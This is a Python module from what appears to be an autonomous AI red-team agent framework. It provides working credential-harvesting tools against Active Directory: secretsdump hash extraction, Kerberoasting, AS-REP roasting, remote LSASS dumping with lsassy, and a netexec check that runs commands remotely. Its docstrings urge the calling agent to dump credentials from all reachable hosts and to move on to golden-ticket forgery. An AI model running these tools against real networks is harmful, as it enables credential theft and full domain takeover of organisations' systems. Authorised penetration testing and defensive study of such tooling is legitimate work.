"""Credential harvesting tools for Active Directory attacks.

This module provides tools for harvesting credentials via AD attacks:
- secretsdump for extracting hashes from Windows systems
- Kerberoasting for service account hash extraction
- AS-REP roasting for users without pre-auth
- Domain admin privilege checking
"""

import asyncio
import re
import shlex
import uuid
from typing import Any, ClassVar

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset
from loguru import logger

from ares.core.models import Hash, SharedRedTeamState
from ares.core.remote import run_remote
from ares.tools.red.common import (
    EMPTY_NT_HASH,
    PLACEHOLDER_PASSWORDS,
    add_user_to_state,
    is_ntlm_hash,
    resolve_password,
    run_tool,
    write_users_file_remote,
)


class CredentialHarvestingTools(Toolset):
    """Tools for harvesting credentials via Active Directory attacks."""

    state: SharedRedTeamState | None = None
    dispatcher: Any | None = None
    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS

    def set_state(self, state: SharedRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def set_dispatcher(self, dispatcher) -> None:
        """Set the dispatcher for inter-agent communication."""
        self.dispatcher = dispatcher

    def _resolve_password(
        self,
        username: str,
        domain: str | None,
        password: str | None,
    ) -> str | None:
        return resolve_password(self.state, username, domain, password)

    def _add_weakness(self, block: str) -> None:
        if not self.state or not block:
            return
        from ares.core.models import SharedRedTeamState

        if isinstance(self.state, SharedRedTeamState):
            self.state.add_weakness(block)
        elif block not in self.state.weaknesses:
            self.state.weaknesses.append(block)

    def _check_smb_connectivity(self, target: str, timeout_seconds: int = 5) -> tuple[bool, str]:
        """Check if SMB port 445 is reachable on target."""
        cmd = ["nc", "-zv", "-w", str(timeout_seconds), target, "445"]
        try:
            ssm_timeout = max(30, timeout_seconds + 5)
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=ssm_timeout)
            if returncode == 0:
                return True, ""
            return False, f"SMB port 445 not reachable: {stderr or stdout}"
        except Exception as e:
            return False, f"Connectivity check failed: {e}"

    def _parse_secretsdump_output(
        self, output: str, domain: str | None, target: str
    ) -> tuple[str, list[dict], bool, bool]:
        """Parse secretsdump output for NTLM hashes.

        Args:
            output: Raw secretsdump output
            domain: Target domain name
            target: Target IP/hostname

        Returns:
            Tuple of (formatted_output, parsed_hashes, has_krbtgt, has_administrator)
        """
        if not output:
            return output, [], False, False

        # Pattern for secretsdump hash lines:
        # username:rid:lmhash:nthash:::
        # or domain\username:rid:lmhash:nthash:::
        hash_pattern = re.compile(
            r"^(?:([^\\:\s]+)\\)?([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::$",
            re.MULTILINE,
        )

        parsed_hashes: list[dict] = []
        has_krbtgt = False
        has_administrator = False

        for match in hash_pattern.finditer(output):
            hash_domain = match.group(1) or domain or ""
            username = match.group(2)
            rid = int(match.group(3))
            lm_hash = match.group(4)
            nt_hash = match.group(5)

            # Skip empty/null hashes (well-known empty password hash)
            if nt_hash == "31d6cfe0d16ae931b73c59d7e0c089c0":  # pragma: allowlist secret
                continue  # Empty password hash

            hash_value = f"{lm_hash}:{nt_hash}"
            is_krbtgt = rid == 502 or username.lower() == "krbtgt"
            is_administrator = rid == 500 or username.lower() == "administrator"

            if is_krbtgt:
                has_krbtgt = True
                logger.warning(f"[!] KRBTGT HASH FOUND! RID={rid}")
            if is_administrator:
                has_administrator = True
                logger.warning(f"[!] ADMINISTRATOR HASH FOUND! RID={rid}")

            parsed_hashes.append(
                {
                    "username": username,
                    "domain": hash_domain,
                    "rid": rid,
                    "hash_value": hash_value,
                    "nt_hash": nt_hash,
                    "is_krbtgt": is_krbtgt,
                    "is_administrator": is_administrator,
                }
            )

            # Add to state
            if self.state:
                hash_obj = Hash(
                    username=username,
                    hash_value=hash_value,
                    hash_type="NTLM",
                    domain=hash_domain,
                )
                if hasattr(self.state, "add_hash"):
                    self.state.add_hash(hash_obj, "secretsdump")
                elif hasattr(self.state, "hashes"):
                    self.state.hashes.append(hash_obj)

        # Prepend summary if high-value hashes found
        summary_lines = []
        if has_krbtgt:
            summary_lines.append(
                "🚨 KRBTGT HASH EXTRACTED - GOLDEN TICKET POSSIBLE!\n"
                "→ Use generate_golden_ticket to forge tickets\n"
                "→ This grants PERSISTENT domain admin access"
            )
        if has_administrator:
            summary_lines.append(
                "🚨 ADMINISTRATOR HASH EXTRACTED - DOMAIN ADMIN ACHIEVED!\n"
                "→ Use domain_admin_checker to verify access\n"
                "→ Run secretsdump on all remaining DCs"
            )

        formatted_output = "\n\n".join(summary_lines) + "\n\n" + output if summary_lines else output

        return formatted_output, parsed_hashes, has_krbtgt, has_administrator

    @dn.tool_method
    def secretsdump(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        dc_ip: str | None = None,
        no_pass: bool = False,
        ticket_path: str | None = None,
        timeout_minutes: int = 3,
        connection_timeout: int = 30,
        skip_connectivity_check: bool = False,
    ) -> str:
        """
        Extract secrets using impacket-secretsdump for credential harvesting.

        This is one of the most powerful tools for extracting credentials from
        Windows systems. It dumps SAM database, cached credentials, and LSA secrets.
        **CRITICAL: When you have admin access, run this on ALL targets, not just one.**

        Args:
            target: Target IP address or domain name
            username: Username with admin privileges
            password: Password for the username (optional)
            hash: NTLM hash for pass-the-hash authentication (optional)
            domain: Domain name (optional, can be inferred)
            dc_ip: Domain controller IP address (recommended for DC targets to avoid DNS issues)
            no_pass: If True, use Kerberos ticket authentication (-k -no-pass)
            ticket_path: Path to .ccache ticket file for Kerberos auth (default: Administrator.ccache)
            timeout_minutes: Maximum time to spend dumping (default: 3)
            connection_timeout: Timeout for initial SMB connection in seconds (default: 30)
            skip_connectivity_check: Skip the SMB port check (default: False)

        Returns:
            Extracted credentials including NTLM hashes, Kerberos keys, and secrets

        Example:
            >>> secretsdump("192.168.58.100", "admin", password="pass")  # pragma: allowlist secret
            >>> secretsdump("192.168.58.100", "admin", hash="aad3b4...")
            >>> secretsdump("dc01.contoso.local", "Administrator", no_pass=True)
            >>> secretsdump("dc01.contoso.local", "Administrator", no_pass=True, ticket_path="admin.ccache")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if hash and not is_ntlm_hash(hash):
            return (
                "[!] Refusing to use non-NTLM hash for secretsdump; provide password or NTLM hash."
            )
        if (
            hash
            and resolved_password
            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
        ):
            resolved_password = None
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."
        if self.state and hasattr(self.state, "add_domain") and domain:
            self.state.add_domain(domain)

        if not skip_connectivity_check:
            is_reachable, error_msg = self._check_smb_connectivity(target)
            if not is_reachable:
                return f"[!] Target {target} is not reachable on SMB port 445. {error_msg}"

        cmd = ["timeout", str(connection_timeout), "impacket-secretsdump"]

        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])

        if resolved_password and domain:
            target_string = f"{domain}/{username}:{resolved_password}@{target}"
        elif resolved_password and not domain:
            target_string = f"{username}:{resolved_password}@{target}"
        elif hash and domain:
            cmd.extend(["-hashes", f":{hash}"])
            target_string = f"{domain}/{username}@{target}"
        elif hash and not domain:
            cmd.extend(["-hashes", f":{hash}"])
            target_string = f"{username}@{target}"
        elif no_pass:
            cmd.extend(["-k", "-no-pass"])
            target_string = f"{username}@{target}"
        else:
            return "[!] Error: Either password, hash, or no_pass must be provided"

        cmd.append(target_string)

        if no_pass:
            ccache_file = ticket_path or "Administrator.ccache"
            cmd = ["env", f"KRB5CCNAME={ccache_file}"] + cmd

        try:
            logger.info(f"[*] Running secretsdump on {target} with {username}")

            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=timeout_minutes * 60)

            if returncode == 124:
                return (
                    f"[!] Secretsdump timed out after {connection_timeout}s connecting to {target}. "
                    "Target may be unreachable or credentials invalid."
                )

            logger.info(f"[*] Secretsdump completed for {target}")
            raw_output = stdout or stderr or f"Secretsdump returned code {returncode}"

            # Parse the output to extract hashes and detect high-value accounts
            formatted_output, _parsed_hashes, has_krbtgt, has_administrator = (
                self._parse_secretsdump_output(raw_output, domain, target)
            )

            # Auto-announce Domain Admin if krbtgt or Administrator hash found
            if (has_krbtgt or has_administrator) and self.dispatcher:
                try:
                    cred_type = "krbtgt_hash" if has_krbtgt else "administrator_hash"
                    da_username = "krbtgt" if has_krbtgt else "Administrator"
                    attack_path = (
                        f"krbtgt hash via secretsdump on {target}"
                        if has_krbtgt
                        else f"Administrator hash via secretsdump on {target}"
                    )

                    # Run async announce in sync context
                    asyncio.run(
                        self.dispatcher.announce_domain_admin(
                            username=da_username,
                            domain=domain or "",
                            attack_path=attack_path,
                            credential_type=cred_type,
                            source_agent="credential_access",
                        )
                    )
                    logger.success(f"🎯 DOMAIN ADMIN AUTO-ANNOUNCED! {cred_type} found on {target}")
                except Exception as e:
                    logger.warning(f"Failed to auto-announce DA: {e}")

            return formatted_output

        except Exception as e:
            return f"[!] Secretsdump error: {e}"

    @dn.tool_method
    def kerberoast(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Perform Kerberoasting attack to extract service account password hashes.

        Kerberoasting is a technique for extracting Kerberos TGS hashes for accounts
        with Service Principal Names (SPNs). These hashes can be cracked offline to
        obtain service account passwords, which often have elevated privileges.

        Args:
            domain: Target domain (e.g., 'contoso.local')
            username: Valid domain username
            password: Password for the username
            dc_ip: Domain controller IP address

        Returns:
            Kerberos TGS hashes for service accounts that can be cracked offline

        Example:
            >>> kerberoast("contoso.local", "user", "pass", "192.168.58.100")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "impacket-GetUserSPNs",
            f"{domain}/{username}:{resolved_password}",
            "-dc-ip",
            dc_ip,
            "-request",
        ]

        try:
            logger.info(f"[*] Kerberoasting {domain} using {username}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)
            output = (stdout or "") + ("\n" + stderr if stderr else "")

            if self.state and output:
                matches = re.findall(r"(\$krb5tgs\$[^\s]+)", output)
                for value in matches:
                    username_value = "Unknown"
                    domain_value = ""
                    parts = value.split("$")
                    if len(parts) >= 5:
                        user_part = parts[3].lstrip("*")
                        realm_part = parts[4]
                        if user_part:
                            username_value = user_part
                        if realm_part:
                            domain_value = realm_part
                    hash_obj = Hash(
                        username=username_value,
                        hash_value=value,
                        hash_type="Kerberos",
                        domain=domain_value or domain,
                    )
                    if hasattr(self.state, "add_hash"):
                        self.state.add_hash(hash_obj, "kerberoast")
                    else:
                        self.state.hashes.append(hash_obj)

            return output

        except Exception as e:
            return f"Kerberoasting failed: {e!s}"

    @dn.tool_method
    def kerberos_user_enum_noauth(
        self,
        domain: str,
        dc_ip: str,
        users_file: str = "",
    ) -> str:
        """
        Validate usernames via Kerberos without creds using GetNPUsers.py -no-pass.

        This uses unauthenticated Kerberos pre-auth recon to confirm
        valid principals even when SMB/LDAP recon is blocked.

        Args:
            domain: Target domain (e.g., 'contoso.local')
            dc_ip: Domain controller IP address
            users_file: Path to usernames file (optional)

        Returns:
            Raw tool output with a summary of validated principals (if any)
        """
        try:
            remote_temp_file = ""
            users_payload = ""
            if users_file:
                check_cmd = ["bash", "-lc", f"test -f {shlex.quote(users_file)}"]
                check_result = run_remote(check_cmd, timeout_seconds=30)
                if check_result.return_code != 0:
                    logger.warning(
                        f"[!] Users file {users_file} not found on remote. Falling back to default list."
                    )
                    users_file = ""

            if not users_file:
                enumerated_users: list[str] = []
                if self.state and self.state.users:
                    enumerated_users = sorted(
                        {user.username for user in self.state.users if user.username}
                    )
                if not enumerated_users:
                    return (
                        "[!] No users_file provided and no enumerated users available. "
                        "Enumerate users first, then retry Kerberos no-auth with a users list."
                    )
                remote_temp_file = f"/tmp/ares-userlist-{uuid.uuid4().hex}.txt"  # nosec B108  # noqa: S108
                users_payload = "\n".join(enumerated_users)
                users_file = remote_temp_file

            if remote_temp_file:
                cmd_script = (
                    f"tmp_file={remote_temp_file}\n"
                    "trap 'rm -f \"$tmp_file\"' EXIT\n"
                    "cat > \"$tmp_file\" <<'EOF'\n"
                    f"{users_payload}\n"
                    "EOF\n"
                    f'impacket-GetNPUsers {domain}/ -usersfile "$tmp_file" -dc-ip {dc_ip} -no-pass\n'
                )
                cmd: list[str] = ["bash", "-lc", cmd_script]
            else:
                cmd = [
                    "impacket-GetNPUsers",
                    f"{domain}/",
                    "-usersfile",
                    users_file,
                    "-dc-ip",
                    dc_ip,
                    "-no-pass",
                ]

            logger.info(f"[*] Kerberos user recon (no-auth) against {domain} via {dc_ip}")
            if self.state and hasattr(self.state, "add_domain"):
                self.state.add_domain(domain)
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=180)
            output = (stdout or "") + ("\n" + stderr if stderr else "")

            validated: set[str] = set()
            for line in output.splitlines():
                if "User " not in line:
                    continue
                if any(
                    marker in line
                    for marker in (
                        "UF_DONT_REQUIRE_PREAUTH",
                        "KDC_ERR_CLIENT_REVOKED",
                        "doesn't have UF_DONT_REQUIRE_PREAUTH set",
                        "does not have UF_DONT_REQUIRE_PREAUTH set",
                    )
                ):
                    match = re.search(r"User\s+([^\s]+)", line)
                    if match:
                        validated.add(match.group(1))

            if validated and self.state:
                for username in sorted(validated):
                    if add_user_to_state(self.state, username, domain, source="kerberos_noauth"):
                        logger.info(f"[+] Recorded user from Kerberos no-auth: {username}@{domain}")

            if validated:
                summary = ", ".join(sorted(validated))
                users_file = f"/tmp/users_kerberos_{uuid.uuid4().hex}.txt"  # nosec B108  # noqa: S108
                # Write users file locally for Kerberos validation
                ok, error = write_users_file_remote(sorted(validated), users_file, target_role=None)
                if ok:
                    file_note = f"\nUsers file: {users_file}"
                else:
                    file_note = f"\n[!] Failed to write users file on remote: {error}"
                result = (
                    f"\u2713 Valid principals (Kerberos no-auth): {summary}{file_note}\n\n{output}"
                )
            else:
                result = output

            if self.state and output:
                matches = re.findall(
                    r"(\$krb5asrep\$\d+\$[^\s:$]+@[^\s:$]+:[0-9a-fA-F]{32}\$[0-9a-fA-F]+)",
                    output,
                )
                for value in matches:
                    username_value = "Unknown"
                    domain_value = ""
                    parts = value.split("$", 3)
                    if len(parts) >= 4:
                        user_realm_part = parts[3]
                        user_realm = user_realm_part.split(":", 1)[0]
                        if "@" in user_realm:
                            username_value, domain_value = user_realm.split("@", 1)
                        elif user_realm:
                            username_value = user_realm
                    hash_obj = Hash(
                        username=username_value,
                        hash_value=value,
                        hash_type="AS-REP",
                        domain=domain_value or domain,
                    )
                    if hasattr(self.state, "add_hash"):
                        self.state.add_hash(hash_obj, "kerberos_noauth")
                    else:
                        self.state.hashes.append(hash_obj)

            return result

        except Exception as e:
            return f"Kerberos user recon (no-auth) failed: {e!s}"

    @dn.tool_method
    def asrep_roast(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Perform AS-REP roasting attack to find users without Kerberos pre-authentication.

        AS-REP roasting targets users with "Do not require Kerberos preauthentication"
        enabled. This misconfiguration allows extracting AS-REP hashes that can be
        cracked offline to obtain user passwords.

        Args:
            domain: Target domain (e.g., 'contoso.local')
            username: Valid domain username (for recon)
            password: Password for the username
            dc_ip: Domain controller IP address

        Returns:
            AS-REP hashes for vulnerable user accounts

        Example:
            >>> asrep_roast("contoso.local", "user", "pass", "192.168.58.100")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "impacket-GetNPUsers",
            f"{domain}/{username}:{resolved_password}",
            "-dc-ip",
            dc_ip,
            "-request",
        ]

        try:
            logger.info(f"[*] AS-REP roasting {domain} using {username}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)
            output = stdout or stderr or ""

            if self.state and output:
                matches = re.findall(
                    r"(\$krb5asrep\$\d+\$[^\s:$]+@[^\s:$]+:[0-9a-fA-F]{32}\$[0-9a-fA-F]+)",
                    output,
                )
                for value in matches:
                    username_value = "Unknown"
                    domain_value = ""
                    parts = value.split("$", 3)
                    if len(parts) >= 4:
                        user_realm_part = parts[3]
                        user_realm = user_realm_part.split(":", 1)[0]
                        if "@" in user_realm:
                            username_value, domain_value = user_realm.split("@", 1)
                        elif user_realm:
                            username_value = user_realm
                    hash_obj = Hash(
                        username=username_value,
                        hash_value=value,
                        hash_type="AS-REP",
                        domain=domain_value,
                    )
                    if hasattr(self.state, "add_hash"):
                        self.state.add_hash(hash_obj, "asrep_roast")
                    else:
                        self.state.hashes.append(hash_obj)

                if matches:
                    usernames = [
                        m.split("$", 3)[3].split(":", 1)[0].split("@")[0]
                        for m in matches
                        if len(m.split("$", 3)) >= 4
                    ]
                    self._add_weakness(
                        f"### AS-REP Roastable Accounts ({len(matches)} found)\n"
                        f"**Vulnerability:** {len(matches)} account(s) have Kerberos "
                        f"pre-authentication disabled, allowing offline password cracking.\n"
                        f"- **Affected Resource:** {', '.join(usernames)}@{domain}\n"
                        f"- **Discovery Method:** impacket-GetNPUsers (AS-REP roasting)\n"
                        f"- **Impact:** Offline cracking may yield valid credentials for "
                        f"lateral movement and privilege escalation."
                    )

            return output

        except Exception as e:
            return f"AS-REP roasting failed: {e!s}"

    @dn.tool_method
    def lsassy(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        method: str = "comsvcs_stealth",
    ) -> str:
        """
        Extract credentials from LSASS memory remotely using lsassy.

        Lsassy is a powerful tool for dumping LSASS memory remotely without
        dropping files to disk (depending on method). It can extract NTLM hashes,
        Kerberos tickets, and plaintext credentials.

        **CRITICAL: When you get admin access, run this on ALL targets to harvest credentials.**

        Args:
            target: Target IP address or hostname
            username: Username with admin privileges on target
            password: Password for authentication (optional if using hash)
            hash: NTLM hash for pass-the-hash authentication (optional)
            domain: Domain name (optional but recommended)
            method: Dump method - 'comsvcs_stealth' (default), 'direct', 'procdump', etc.

        Returns:
            Extracted credentials including NTLM hashes and plaintext passwords

        Example:
            >>> lsassy("192.168.58.100", "admin", password="P@ss", domain="contoso.local")  # pragma: allowlist secret
            >>> lsassy("192.168.58.100", "admin", hash="aad3b4...", domain="contoso.local")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if hash and not is_ntlm_hash(hash):
            return "[!] Refusing to use non-NTLM hash for lsassy; provide password or NTLM hash."
        if (
            hash
            and resolved_password
            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
        ):
            resolved_password = None
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = ["lsassy"]

        if domain:
            cmd.extend(["-d", domain])

        cmd.extend(["-u", username])

        if resolved_password:
            cmd.extend(["-p", resolved_password])
        elif hash:
            cmd.extend(["-H", hash])
        else:
            return "[!] Error: Either password or hash must be provided"

        cmd.extend(["-m", method])
        cmd.append(target)

        try:
            logger.info(f"[*] Running lsassy on {target} with {username}")
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=180)

            output = stdout or ""
            if stderr:
                output = output + "\n" + stderr if output else stderr

            if returncode != 0 and not output:
                return f"[!] Lsassy failed with return code {returncode}"

            # Parse output for credentials
            # lsassy output format:
            # DOMAIN\username:password
            # or DOMAIN\username:::NTLM_HASH
            has_admin = False
            has_krbtgt = False
            cred_count = 0
            hash_count = 0

            # Pattern for plaintext creds: DOMAIN\user:password (no colons in middle)
            plaintext_pattern = re.compile(
                r"^([^\\:]+)\\([^:]+):([^:]+)$",
                re.MULTILINE,
            )

            # Pattern for NTLM hashes: DOMAIN\user:::HASH or user:RID:LM:NT
            hash_pattern = re.compile(
                r"^(?:([^\\:\s]+)\\)?([^:]+)(?::(\d+))?:([a-fA-F0-9]{32})?:([a-fA-F0-9]{32})(?:::)?$",
                re.MULTILINE,
            )

            # Extract plaintext credentials
            for match in plaintext_pattern.finditer(output):
                cred_domain = match.group(1)
                cred_user = match.group(2)
                cred_pass = match.group(3)

                if cred_pass and len(cred_pass) > 0:
                    cred_count += 1
                    if cred_user.lower() == "administrator":
                        has_admin = True
                        logger.warning("[!] ADMINISTRATOR plaintext password found!")

                    if self.state:
                        from ares.core.models import Credential

                        cred = Credential(
                            username=cred_user,
                            password=cred_pass,
                            domain=cred_domain or domain or "",
                        )
                        self.state.add_credential(cred, "lsassy")

            # Extract NTLM hashes
            for match in hash_pattern.finditer(output):
                hash_domain = match.group(1) or domain or ""
                hash_user = match.group(2)
                lm_hash = match.group(4) or "aad3b435b51404eeaad3b435b51404ee"
                nt_hash = match.group(5)

                if nt_hash and nt_hash != EMPTY_NT_HASH:
                    hash_count += 1
                    hash_value = f"{lm_hash}:{nt_hash}"

                    if hash_user.lower() == "administrator":
                        has_admin = True
                        logger.warning("[!] ADMINISTRATOR hash found!")
                    if hash_user.lower() == "krbtgt":
                        has_krbtgt = True
                        logger.warning("[!] KRBTGT hash found!")

                    if self.state:
                        hash_obj = Hash(
                            username=hash_user,
                            hash_value=hash_value,
                            hash_type="NTLM",
                            domain=hash_domain,
                        )
                        if hasattr(self.state, "add_hash"):
                            self.state.add_hash(hash_obj, "lsassy")
                        elif hasattr(self.state, "hashes"):
                            self.state.hashes.append(hash_obj)

            # Prepend summary
            summary_lines = []
            if has_krbtgt:
                summary_lines.append(
                    "🚨 KRBTGT HASH EXTRACTED - GOLDEN TICKET POSSIBLE!\n"
                    "→ Use generate_golden_ticket to forge tickets\n"
                    "→ This grants PERSISTENT domain admin access"
                )
            if has_admin:
                summary_lines.append(
                    "🚨 ADMINISTRATOR CREDENTIALS FOUND!\n"
                    "→ Use for lateral movement or secretsdump\n"
                    "→ Check all DCs for full domain compromise"
                )
            if cred_count > 0 or hash_count > 0:
                summary_lines.append(
                    f"✅ Extracted {cred_count} plaintext cred(s), {hash_count} hash(es)"
                )

            if summary_lines:
                output = "\n\n".join(summary_lines) + "\n\n" + output

            # Auto-announce Domain Admin if high-value credentials found
            if (has_krbtgt or has_admin) and self.dispatcher:
                try:
                    cred_type = "krbtgt_hash" if has_krbtgt else "administrator_credentials"
                    da_username = "krbtgt" if has_krbtgt else "Administrator"
                    attack_path = f"lsassy credential dump on {target}"

                    asyncio.run(
                        self.dispatcher.announce_domain_admin(
                            username=da_username,
                            domain=domain or "",
                            attack_path=attack_path,
                            credential_type=cred_type,
                            source_agent="credential_access",
                        )
                    )
                    logger.success(f"🎯 DOMAIN ADMIN AUTO-ANNOUNCED! {cred_type} found on {target}")
                except Exception as e:
                    logger.warning(f"Failed to auto-announce DA: {e}")

            return output

        except Exception as e:
            return f"[!] Lsassy error: {e}"

    @dn.tool_method
    def domain_admin_checker(
        self,
        targets: str,
        username: str,
        password: str = "",
        hash: str = "",
    ) -> str:
        """
        Check if a compromised account has domain admin privileges across multiple targets.

        This tool is CRITICAL for identifying domain admin access. When you find an
        Administrator hash or password, IMMEDIATELY use this tool to check ALL targets.
        Look for "Pwn3d!" in the output which indicates administrative access.

        Args:
            targets: Space-separated IP addresses to check
            username: Username for authentication
            password: Password for authentication (optional)
            hash: NTLM hash for pass-the-hash authentication (optional)

        Returns:
            Results showing which targets the account has admin access on

        Example:
            >>> domain_admin_checker("192.168.58.100 192.168.58.101", "Administrator", password="P@ss")  # pragma: allowlist secret
            >>> domain_admin_checker("192.168.58.100 192.168.58.101", "Administrator", hash="aad3b4...")
        """
        resolved_password = self._resolve_password(username, "", password or None)
        if (
            hash
            and resolved_password
            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
        ):
            resolved_password = None
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        try:
            cmd = ["netexec", "smb"] + targets.split(" ")

            if resolved_password:
                logger.info(f"[*] Domain admin checker using password for {username}")
                cmd.extend(["-u", username, "-p", resolved_password])
            elif hash:
                logger.info(f"[*] Domain admin checker using hash for {username}")
                cmd.extend(["-u", username, "-H", hash])
            else:
                return "[!] Error: Either password or hash must be provided"

            cmd.extend(["-x", "whoami"])

            # netexec is only installed on RECON pods - route there
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120, target_role="recon")

            output = stdout
            if stderr:
                output += "\n" + stderr if output else stderr

            logger.info(f"[*] Domain admin check completed for {targets}")
            return output

        except Exception as e:
            logger.error(f"Domain admin checker failed: {e}")
            return f"Domain admin checker failed: {e}"


__all__ = ["CredentialHarvestingTools"]
